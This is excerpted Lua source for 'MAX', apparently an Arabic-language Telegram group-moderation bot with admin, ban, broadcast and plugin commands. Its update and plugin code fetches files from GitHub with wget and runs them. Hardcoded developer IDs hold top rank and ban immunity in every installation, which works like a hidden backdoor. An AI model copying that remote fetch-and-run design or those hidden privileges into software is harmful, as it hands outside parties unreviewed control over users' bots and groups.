...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻 ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻 ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "TG IS NOT FIND IN FILES BOT"
echo "𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻 𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻 ┉"
exit 1
fi
if [ ! $token ]; then
echo "𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻 𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻 ┉ ┉"
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./MAX.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("CK", "w")  
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MAXTEAM/Files_MAX/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1695110211,1566031059,1856656467,1033028167}   
...
function DevMAX(msg) 
local hash = database:sismember(bot_id.."Dev:MAX:2", msg.sender_user_id_) 
...
if hash or SudoBot(msg) or DevMAX(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevMAX(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMAX(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMAX(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMAX(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
local hash = database:sismember(bot_id.."D9l9l:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevMAX(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
...
if hash or SudoBot(msg) or DevMAX(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMAX(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
var = true 
elseif tonumber(user_id) == tonumber(1856656467) then
var = true 
...
var = true  
elseif database:sismember(bot_id.."Dev:MAX:2", user_id) then
var = true  
...
var = true  
elseif database:sismember(bot_id..'D9l9l:MN:TF'..chat_id, user_id) then
var = true 
...
local UserName = (data.username_ or "TEM_MAX")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇MAX.")  
...
--------------------------------------------------------------------------------------------------------------
function SourceMAX(msg,data) -- بداية العمل
if msg then
...
if DevMAX(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,MAX_Msg) 
return false  
end 
if text then    
...
if text == 'تفعيل التواصل ☆' and DevMAX(msg) then  
...
if text == 'تعطيل التواصل ☆' and DevMAX(msg) then  
...
if text == 'تفعيل البوت الخدمي ☆' and DevMAX(msg) then  
...
if text == 'تعطيل البوت الخدمي ☆' and DevMAX(msg) then  
...
if text == 'ضع كليشه ستارت ☆' and DevMAX(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'☆︙ ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت ☆' and DevMAX(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,'☆︙ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر ☆' and DevMAX(msg) then 
...
if text == 'تحديث السورس☆' and DevMAX(msg) then 
os.execute('rm -rf MAX.lua')
os.execute('wget https://raw.githubusercontent.com/MAXTEAM/MAX/main/MAX.lua')
send(msg.chat_id_, msg.id_,'☆︙ تم تحديث السورس\n☆︙ لديك اخر اصدار لسورس MAX\n☆︙ الاصدار » { v 1.6 }')
dofile('MAX.lua')  
end
if text == 'الاصدار ☆' and DevMAX(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'☆︙ اصدار  MAX \n☆︙ الاصدار »{ v 1.6 }')
end
if text == "ضع اسم للبوت ☆" and DevMAX(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"☆︙ ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات ☆' and DevMAX(msg) then 
...
if text == 'المشتركين ☆' and DevMAX(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n☆︙ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الكروبات ☆' and DevMAX(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n☆︙ الكروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ☆") and DevMAX(msg) then
...
if text == ("الثانويين ☆") and DevMAX(msg) then
local list = database:smembers(bot_id..'Dev:MAX:2')
t = "\n☆︙ قائمة الثانويين \n𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
-------------
if text == "حصريات و تحديثات MAX" and DevMAX(msg) then
local updatech =[[
...
-----------
if text == ("قائمه العام ☆") and DevMAX(msg) then
...
if text == ("قائمه الكتم العام ☆") and DevMAX(msg) then
...
if text=="اذاعه خاص ☆" and msg.reply_to_message_id_ == 0 and DevMAX(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☆︙ ارسل الان اذاعتك؟ \n☆︙ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه ☆" and msg.reply_to_message_id_ == 0 and DevMAX(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☆︙ ارسل الان اذاعتك؟ \n☆︙ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت ☆" and msg.reply_to_message_id_ == 0 and DevMAX(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☆︙ ارسل الان اذاعتك؟ \n☆︙ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه ☆" and msg.reply_to_message_id_ == 0  and DevMAX(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☆︙ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص ☆" and msg.reply_to_message_id_ == 0  and DevMAX(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☆︙ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ☆' and DevMAX(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ☆" and DevMAX(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف الكروبات ☆" and DevMAX(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'☆︙  عدد الكروبات الان » { '..#group..' }'..MAXk..''..MAX..'\n☆︙  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevMAX(msg) then
...
usertext = '\n☆︙ العضو » ['..result.title_..'](t.me/'..(username or 'TEM_MAX')..')'
status  = '\n☆︙ تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevMAX(msg) then
...
usertext = '\n☆︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEM_MAX')..')'
status  = '\n☆︙ تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevMAX(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevMAX(msg) then
...
local MAX1_Msg = database:get(bot_id.."MAX1:Add:Filter:Rp2"..text..msg.chat_id_)   
if MAX1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'☆︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'TEM_MAX')..') \n☆︙ '..MAX1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if MAX_Msg and not Special(msg) then  
local MAX_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if MAX_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"☆︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n☆︙ ["..MAX_Msg.."] \n")
else
send(msg.chat_id_,0,"☆︙ العضو : {["..data.first_name_.."](T.ME/TEM_MAX)}\n☆︙ ["..MAX_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "☆︙ عذرا » {["..data.first_name_.."](T.ME/TEM_MAX)}\n☆︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevMAX(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevMAX(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevMAX(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '☆︙ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevMAX(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '☆︙ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ☆" and DevMAX(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "☆︙ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ☆$") and DevMAX(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '☆︙ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ☆" and DevMAX(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري ☆" and DevMAX(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "☆︙ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ☆" and DevMAX(msg) then  
...
database:sadd(bot_id.."MAX:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."MAX:blocname"..msg.chat_id_)
...
function D9l9l_name(t1,t2)
if t2.id_ then 
name_MRMAX = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRMAX then 
names_MRMAX = database:smembers(bot_id.."MAX:blocname"..msg.chat_id_) or ""
if names_MRMAX and names_MRMAX[1] then 
for i=1,#names_MRMAX do 
if name_MRMAX:match("(.*)("..names_MRMAX[i]..")(.*)") then 
...
bnnaGet(msg.sender_user_id_, D9l9l_name)
end
...
database:set(bot_id.."MAX:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."MAX:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."MAX:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."MAX:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."MAX:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function MAX_mrMAX_new(mrMAX1,mrMAX2)
if mrMAX2 and mrMAX2.first_name_ then 
if mrMAX2.first_name_:match("(.*)"..database:get(bot_id.."MAX:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."MAX:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrMAX_nnn = database:get(bot_id.."MAX:nump"..msg.chat_id_) or 5
local mrMAX_nnn2 = database:get(bot_id.."MAX:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrMAX_nnn2) == tonumber(mrMAX_nnn) or tonumber(mrMAX_nnn2) > tonumber(mrMAX_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."MAX:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "☆︙ عزيزي >>["..mrMAX2.username_.."](https://t.me/"..(mrMAX2.username_ or "TEM_MAX")..")\n☆︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."MAX:teh"..msg.chat_id_).."} بجانب اسمك\n☆︙ عدد المحاولات المتبقيه {"..(tonumber(mrMAX_nnn) - tonumber(mrMAX_nnn2)).."}")
end
end
end
end
bnnaGet(id, MAX_mrMAX_new)
end
end
...
local MAXChengName = database:get(bot_id.."MAX:Cheng:Name"..data.id_)
if not data.first_name_ then 
if MAXChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..MAXChengName..']')
database:del(bot_id.."MAX:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if MAXChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."MAX:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local MAXChengUserName = database:get(bot_id.."MAX:Cheng:UserName"..data.id_)
if not data.username_ then 
if MAXChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..MAXChengUserName..']')
database:del(bot_id.."MAX:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if MAXChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."MAX:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local MAXChengPhoto = database:get(bot_id.."MAX:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if MAXChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."MAX:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if MAXChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."MAX:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
☆ ↬⦑ SOURCE MAX ⦒ 
==================
☆ ↬︙ [Source Channel](http://t.me/TEM_MAX)
==================
☆ ↬︙ [Source Update](http://t.me/TEM_MAX)      
==================
☆ ↬︙ [Source developer](http://t.me/X444F)    
===================
☆ ↬︙ [MAX Source Developer](http://t.me/S_X_X_G)
===================
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
if text == 'رفع نسخه الاحتياطيه' and DevMAX(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_, '*☆︙بواسطه* » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'IIIS1')..') \n*☆︙تم تفعيل التنظيف التلقائي* ')
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'☆︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'TEM_MAX')..') \n☆︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'☆︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'TEM_MAX')..') \n☆︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevMAX(msg) then    
dofile('MAX.lua')  
send(msg.chat_id_, msg.id_, '☆︙ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevMAX(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevMAX(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if result.sender_user_id_ == tonumber(1695110211) then
send(msg.chat_id_, msg.id_, "☆︙ لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور ال \n")
return false 
end
if result.sender_user_id_ == tonumber(1695110211) then
send(msg.chat_id_, msg.id_, "☆︙ لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور ال \n")
...
if text and text:match("^حظر عام @(.*)$")  and DevMAX(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevMAX(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevMAX(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevMAX(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevMAX(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevMAX(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevMAX(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevMAX(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevMAX(msg) then
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."D9l9l:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'D9l9l:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,MAX)
x = 0
tags = 0
local list = MAX.members_
for k, v in pairs(list) do
...
if text == 'الملفات' and DevMAX(msg) then
t = ' ☆∫ ملفات سورس MAX ↓\n𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻ٴ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevMAX(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MAXTEAM/Files_MAX/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☆∫ اهلا بك في متجر ملفات MAX\n ☆∫ ملفات السورس ↓\n𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻ٴ\n\n"
local TextE = "\n𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻ٴ\n ☆∫ علامة تعني { ✓ } ملف مفعل\n ☆∫ علامة تعني { ✘ } ملف معطل\n ☆∫ قناة  MAX ↓\n".." ☆∫ [اضغط هنا لدخول](t.me/TEM_MAX) \n"
local NumFile = 0
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevMAX(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/MAXTEAM/Files_MAX/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('MAX.lua')  
else
send(msg.chat_id_, msg.id_," ☆∫ عذرا الملف لايدعم  MAX \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevMAX(msg) then
...
if text == "مسح الملفات" and DevMAX(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ☆∫ تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevMAX(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevMAX(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if database:get(bot_id..'DRAGOON:change:MAX'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:MAX'..msg.chat_id_)  
else
...
if not database:get(bot_id..'DRAGOON:change:MAX'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:MAX'..msg.chat_id_,true)  
Text = '\n☆︙ تم تعطيل امر تحويل'
else
...
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:MAX'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
local UserName = (b.username_ or "SRC-MAX")
...
function Function_MAX(extra, result, success)
database:sadd(bot_id.."Dev:MAX:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","☆︙ تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_MAX, nil)
return false 
end
...
function Function_MAX(extra, result, success)
database:srem(bot_id.."Dev:MAX:2", result.sender_user_id_)
...
function Function_MAX(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:MAX:2", result.id_)
...
database:srem(bot_id.."Dev:MAX:2", userid)
...
database:del(bot_id..'D9l9l:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '☆︙ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'D9l9l:MN:TF'..msg.chat_id_)
t = "\n☆︙ قائمة المنظفين \n≪━━━━━━MAX━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'D9l9l:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n☆︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEM_MAX')..')'
status  = '\n☆︙ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
...
database:sadd(bot_id..'D9l9l:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n☆︙ العضو » ['..result.title_..'](t.me/'..(username or 'TEM_MAX')..')'
status  = '\n☆︙ تم ترقيته منظف'
texts = usertext..status
else
...
database:sadd(bot_id..'D9l9l:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n☆︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEM_MAX')..')'
status  = '\n☆︙ تم ترقيته منظف'
...
function start_function(extra, result, success)
database:srem(bot_id..'D9l9l:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n☆︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEM_MAX')..')'
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'D9l9l:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n☆︙ العضو » ['..result.title_..'](t.me/'..(username or 'TEM_MAX')..')'
status  = '\n☆︙ تم تنزيله من المنظفين'
texts = usertext..status
else
...
database:srem(bot_id..'D9l9l:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n☆︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEM_MAX')..')'
status  = '\n☆︙ تم تنزيله من المنظفين'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n☆︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEM_MAX')..')'
status  = '\n☆︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n☆︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n☆︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEM_MAX')..')'
...
-----------------------------------------------------
if text == 'تنزيل الكلوب' and Mod(msg) then
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '☆︙ تم مسح جميع الكلوب')
end
if text == ("تاك للكلوب") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n☆︙ قائمه الكلوب بالكروب \n𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n☆︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n☆︙ تم رفع العضــو بكلبك في الكروب \n☆︙  رفعتك بكلبي لا تجرحه '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if (text == ("تنزيل من كلبي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n☆︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEM_MAX')..')'
status  = '\n☆︙ تم تنزيل العضــو كلبك من الكروب\n☆︙ نزلتك من كلبي مو كتلك لا تجرحني'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:set(bot_id.."MAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."MAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"☆︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."MAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
